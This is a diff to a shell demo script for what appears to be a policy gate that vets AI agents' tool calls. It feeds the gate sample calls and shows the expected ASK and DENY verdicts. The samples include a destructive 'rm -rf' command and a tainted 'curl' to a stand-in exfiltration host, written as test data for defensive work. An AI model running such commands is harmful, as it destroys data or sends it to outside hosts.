@@ -11,8 +11,12 @@ cd "$(dirname "$0")/.."
 WORLD=docs/demos/one-kernel/demo-world.yaml
 
 # Build the binary if needed.
+# Debug first, deliberately: `scripts/check-demos.sh` builds the workspace in debug
+# and then runs this. Preferring a release binary meant the guard could validate a
+# stale one that happened to be lying around — which it did, passing locally while
+# CI (with no release build) correctly failed.
 BIN=""
-for c in target/release/harness target/debug/harness; do
+for c in target/debug/harness target/release/harness; do
   [ -x "$c" ] && BIN="$c" && break
 done
 if [ -z "$BIN" ]; then
@@ -66,13 +70,13 @@ mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
 {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"jira_delete_issue","arguments":{"issue_key":"DEMO-1"}}}' | pretty_tools
 
 step "4) destructive bash via the gate, interactive -> ASK (kernel classifies rm -rf, D36)"
-gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"interactive","taint":"clean","source_channel":"user_prompt"}}'
+gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"interactive","taint":"clean","source_channel":"user_prompt","usage":{}}}'
 
 step "5) the SAME call in background -> DENY (the kernel collapses ASK, invariant 10)"
-gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"background","taint":"clean","source_channel":"user_prompt"}}'
+gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"background","taint":"clean","source_channel":"user_prompt","usage":{}}}'
 
 step "6a) tainted curl -> DENY taint_invariant (injection -> egress, severed)"
-gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"demo","mode":"interactive","taint":"tainted","source_channel":"user_prompt"}}'
+gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"demo","mode":"interactive","taint":"tainted","source_channel":"user_prompt","usage":{}}}'
 
 step "6b) tainted jira_add_comment via the gateway (--taint tainted) -> DENY"
 mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
@@ -82,8 +86,8 @@ mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
 step "7) parity beat: the identical semantic request, sent the cc-hook way and the OpenCode way"
 # cc-hook sends the host event; the OpenCode plugin sends the GateRequest wire
 # shape with nulls spelled out. Same kernel, same world -> identical verdict.
-CC=$(gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"cc","mode":"interactive","taint":"tainted","source_channel":"user_prompt"}}')
-OC=$(gate '{"v":1,"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"oc","mode":"interactive","taint":"tainted","source_channel":"user_prompt","approval_token":null}}')
+CC=$(gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"cc","mode":"interactive","taint":"tainted","source_channel":"user_prompt","usage":{}}}')
+OC=$(gate '{"v":1,"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"oc","mode":"interactive","taint":"tainted","source_channel":"user_prompt","approval_token":null,"usage":{}}}')
 echo "  Claude Code shape : $CC"
 echo "  OpenCode shape    : $OC"
 if [ "$CC" = "$OC" ]; then
